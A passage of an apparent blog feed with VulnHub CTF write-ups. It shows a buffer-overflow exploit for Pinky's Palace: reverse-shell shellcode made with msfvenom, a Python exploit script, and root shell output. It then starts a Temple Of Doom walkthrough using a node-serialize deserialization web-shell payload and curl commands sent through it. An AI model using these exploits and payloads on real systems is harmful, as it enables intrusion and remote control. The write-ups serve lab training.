    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the script.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 fuzz.py             
Done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see the stack is overwritten with A’s (41 hex equivalent), and the instruction pinter with 6 B’s (42 hex equivalent).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/40wx &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
0x7fffffffd350: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd360: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd370: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd380: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd390: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3b0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3c0: 0x41414141      0x41414141      0x42424242      0x00004242
0x7fffffffd3d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffd3e0: 0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/wx &lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;
0x424242424242: Cannot access memory at address 0x424242424242
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we find the address &lt;strong&gt;0x400cfb&lt;/strong&gt; which jumps to the stack.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jmpcall 
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next step is to generate a shellcode of no more than 120 bytes, luckily for us the following msfvenom command generated a shellcode of 119 bytes.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;--platform&lt;/span&gt; linux &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x64 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x64/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.179.1 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; x64/xor &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; py &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We rebuild our shellcode again adding first 1 NOP (\x90), then the shellcode (119 bytes), and finally the &lt;strong&gt;call rsp&lt;/strong&gt; address, as shown in the following script.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.179.178&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xef\xff\xff\xff\x48\xbb\x40\xb0\xfc\x68\x52\x27\xde&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2a\x99\xa4\xf1\x38\x25\x81\xa1\x41\xee\xf3\x6d\x1a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb0\x96\x72\x42\xb0\xfd\xd3\x92\x8f\x6d\xca\x11\xf8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x75\x8e\x38\x37\x84\xa1\x6a\xe8\xf3\x6d\x38\x24\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xbf\x7e\x96\x49\x0a\x28\xdb\xbe\xb6\xda\xc7\x30&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcb\x6f\x65\xe4\x22\xd9\x92\x47\x21\x4f\xde\x98\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x39\x1b\x3a\x05\x6f\x57\x2d\x4f\xb5\xfc\x68\x52\x27&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xde\xcb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xfb\x0c\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0x400cfb  call rsp
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'latin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We set up a netcat listener in our case on port 443, and run the exploit.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 exploit.py
Done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have a root shell, and we can read de root flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.178] 34066
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null
root@Pinkys-Palace:/daemon# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@Pinkys-Palace:/root# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;root.txt
root@Pinkys-Palace:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt

 ____  _       _          _     
|  _ &lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_ __ | | ___   _&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;___ 
| |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | | &lt;span class=&quot;s1&quot;&gt;'_ \| |/ / | | |// __|
|  __/| | | | |   &amp;lt;| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!   
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
root@Pinkys-Palace:/root#
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: A realistic Boot2Root.</summary></entry><entry><title type="html">VulnHub - Temple Of Doom 1</title><link href="http://localhost:4000/temple-of-doom.html" rel="alternate" type="text/html" title="VulnHub - Temple Of Doom 1" /><published>2021-12-14T00:00:00-05:00</published><updated>2021-12-14T00:00:00-05:00</updated><id>http://localhost:4000/temple_of_doom</id><content type="html" xml:base="http://localhost:4000/temple-of-doom.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; A CTF machine intended to improve skills in penetration testing.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; 0katz&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root shell and read the flag.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/temple-of-doom-1,243/&quot;&gt;https://www.vulnhub.com/entry/temple-of-doom-1,243/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;A ping scan on the local network reveals the target machine, the script can be downloaded &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.177 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;Full TCP port scan with nmap detected two open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.179.177 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all-tcp-ports.txt
...
PORT    STATE SERVICE
22/tcp  open  ssh
666/tcp open  doom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;Version detection and script scanning was performed with nmap to discover more information about open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,666 192.168.179.177 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
666/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumeration-on-port-666&quot;&gt;Enumeration on port 666&lt;/h3&gt;

&lt;p&gt;Browsing the web page an error message was detected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Researching a little bit about the error was possible to detect a remote code execution vulnerability for this version of node js.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit node serialize
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
 Exploit Title                                                 |  Path
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
Node.JS - &lt;span class=&quot;s1&quot;&gt;'node-serialize'&lt;/span&gt; Remote Code Execution               | linux/remote/45265.js
Node.JS - &lt;span class=&quot;s1&quot;&gt;'node-serialize'&lt;/span&gt; Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           | nodejs/webapps/49552.py
Node.JS - &lt;span class=&quot;s1&quot;&gt;'node-serialize'&lt;/span&gt; Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           | nodejs/webapps/50036.js
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;insecure-deserealization&quot;&gt;Insecure Deserealization&lt;/h3&gt;

&lt;p&gt;This occurs when untrusted input is passed into unserialize() function in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE), more information on this topic you can find it &lt;a href=&quot;https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We copy this exploit to our current directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; nodejs/webapps/50036.js
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we analyze the exploit code, we need to inject our payload into the cookie value to trigger the execution of commands.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;50036.js 
&lt;span class=&quot;c&quot;&gt;# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (3)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Date: 17.06.2021&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Exploit Author: Beren Kuday GORUN&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Vendor Homepage: https://github.com/luin/serialize&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Software Link: https://github.com/luin/serialize&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Version: 0.0.4&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Tested on: Windows &amp;amp; Ubuntu&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# CVE : 2017-5941&lt;/span&gt;

var serialize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'node-serialize'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
var payload &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;webShell&quot;&lt;/span&gt; : &lt;span class=&quot;s2&quot;&gt;&quot;_&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ND_FUNC&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(443); }()&quot;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
serialize.unserialize&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;serialize.serialize&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# after being exploited&lt;/span&gt;

┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root@kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/home/kali]
└─# curl http://10.0.2.4:443?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nodeadmin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can replicate the exploitation process manually, first we intercept the request with burp, right click and &lt;strong&gt;Send to Repeater&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the repeater tab we click &lt;strong&gt;Send&lt;/strong&gt; to have a baseline of the response length, then we copy the cookie value for take it to the burp &lt;strong&gt;Decoder&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The cookie set by the server is a base64 encoded JSON object, we need to decode it to URL first and then to base64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We copy the payload from the script and base64 encode it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;strong&gt;Repeater&lt;/strong&gt; tab, we paste the resulting string in base64 as the cookie value, then click &lt;strong&gt;Send&lt;/strong&gt;, this webshell listens on port 443 waiting for incoming commands via cmd parameter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/templeofdoom/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using curl we can run commands through the cmd parameter.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://192.168.179.177:443?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id 
